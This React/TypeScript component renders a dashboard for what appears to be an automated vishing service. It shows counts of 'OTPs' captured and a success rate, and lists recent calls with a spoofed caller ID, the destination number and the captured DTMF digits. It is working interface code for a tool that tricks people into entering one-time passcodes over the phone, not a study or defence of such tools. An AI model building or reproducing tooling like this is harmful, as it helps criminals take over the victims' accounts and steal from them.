"use client";

import { useState, useEffect, useRef } from "react";
import { motion } from "framer-motion";
import { api } from "@/lib/api";

function AnimatedNumber({ value, prefix = "", suffix = "", className = "" }: { value: number; prefix?: string; suffix?: string; className?: string }) {
  const [display, setDisplay] = useState(0);
  const ref = useRef<number>(0);

  useEffect(() => {
    const target = typeof value === "number" ? value : 0;
    const start = ref.current;
    const diff = target - start;
    if (diff === 0) return;
    const duration = 600;
    const startTime = Date.now();

    const tick = () => {
      const elapsed = Date.now() - startTime;
      const progress = Math.min(elapsed / duration, 1);
      const eased = 1 - Math.pow(1 - progress, 3);
      const current = Math.round(start + diff * eased);
      setDisplay(current);
      if (progress < 1) requestAnimationFrame(tick);
      else ref.current = target;
    };
    requestAnimationFrame(tick);
  }, [value]);

  return <span className={className}>{prefix}{display}{suffix}</span>;
}

export default function Stats() {
  const [stats, setStats] = useState<any>({});
  const [calls, setCalls] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const load = () => {
      Promise.all([api.getStats(), api.getRecentCalls()])
        .then(([s, c]) => { setStats(s); setCalls(c.calls || []); })
        .catch(()=>{})
        .finally(() => setLoading(false));
    };
    load();
    const interval = setInterval(load, 10000);
    return () => clearInterval(interval);
  }, []);

  const metrics = [
    { label: "Calls", value: stats.total_calls ?? 0, color: "text-blue-400", icon: "📞" },
    { label: "Minutes", value: stats.total_minutes ?? 0, color: "text-green-400", icon: "⏱" },
    { label: "Tokens", value: stats.total_tokens ?? 0, color: "text-yellow-400", icon: "🪙" },
    { label: "OTPs", value: stats.otps_captured ?? 0, color: "text-red-400", icon: "🎯" },
    { label: "Rate", value: stats.success_rate ?? 0, color: "text-purple-400", icon: "📈", suffix: "%" },
  ];

  return (
    <div className="flex flex-col gap-5 pt-2">
      {/* Metrics grid */}
      <div className="grid grid-cols-5 gap-2">
        {metrics.map((m, i) => (
          <motion.div
            key={m.label}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: i * 0.05 }}
            className="card text-center py-3 px-1"
          >
            <div className="text-lg mb-1">{m.icon}</div>
            <div className={`font-mono text-lg font-bold ${m.color}`}>
              <AnimatedNumber value={m.value} suffix={m.suffix || ""} />
            </div>
            <div className="text-[#525252] text-[9px] font-mono tracking-wider uppercase mt-1">{m.label}</div>
          </motion.div>
        ))}
      </div>

      {/* Call history */}
      <div className="card">
        <div className="text-[10px] text-[#525252] font-mono tracking-widest uppercase mb-3">Recent Calls</div>
        {loading ? (
          <div className="space-y-2">
            {[1,2,3].map(i => (
              <div key={i} className="skeleton h-12 rounded-lg" />
            ))}
          </div>
        ) : calls.length === 0 ? (
          <div className="text-center py-8">
            <div className="text-[#262626] text-3xl mb-2">📞</div>
            <div className="text-[#404040] text-xs">No calls yet</div>
          </div>
        ) : (
          <div className="space-y-2 max-h-80 overflow-y-auto">
            {calls.map((c: any, i: number) => (
              <motion.div
                key={c.id}
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: i * 0.03 }}
                className="flex items-center justify-between text-xs bg-white/[0.02] rounded-lg p-3 border border-white/[0.03] hover:border-white/[0.06] transition-colors"
              >
                <div className="flex-1 min-w-0">
                  <div className="text-white font-mono text-[13px] truncate">
                    {c.spoofed_caller_id} → {c.destination_number}
                  </div>
                  <div className="text-[#525252] text-[10px] font-mono mt-0.5">
                    {c.duration_seconds}s • ${c.cost_usd?.toFixed(2)} • {c.dtmf_captured ? `DTMF: ${c.dtmf_captured}` : "No DTMF"}
                  </div>
                </div>
                <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full ml-2 shrink-0 ${
                  c.status === "completed"
                    ? "bg-green-500/10 text-green-400 border border-green-500/20"
                    : "bg-yellow-500/10 text-yellow-400 border border-yellow-500/20"
                }`}>
                  {c.status}
                </span>
              </motion.div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
